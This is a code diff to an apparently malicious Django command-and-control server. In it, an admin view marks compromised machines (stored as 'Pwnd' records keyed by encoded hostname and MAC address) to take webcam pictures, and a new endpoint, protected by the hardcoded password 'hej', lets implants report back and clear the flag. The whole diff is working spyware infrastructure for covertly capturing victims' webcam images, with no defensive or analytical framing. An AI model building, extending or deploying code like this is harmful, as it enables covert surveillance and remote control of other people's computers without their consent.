@@ -51,9 +51,8 @@ def c2_admin(request):
         try:
             if request.POST["webcam"]:
                 pwnd = Pwnd.objects.get(id=request.POST["id"])
-                print(pwnd.webcam)
-                pwnd.webcam = pwnd.
-                pwnd.save
+                pwnd.webcam = pwnd.take_webcam_pic.TRUE
+                pwnd.save()
         except:
             pass
 
@@ -62,3 +61,13 @@ def c2_admin(request):
 
     }
     return render(request, "c2_admin.html", context)
+
+def log_webcam_pic(request):
+    if request.method == "GET":
+        if request.GET["password"] == "hej":
+            hostname = request.GET["hostname"]
+            mac_address = request.GET["mac_address"]
+            pwnd = Pwnd.objects.get(id = base64.b16encode(hostname.encode()).decode("utf-8") + base64.b16encode(mac_address.encode()).decode("utf-8"))
+            pwnd.webcam = pwnd.take_webcam_pic.FALSE
+            pwnd.save()
+    return HttpResponse(request)
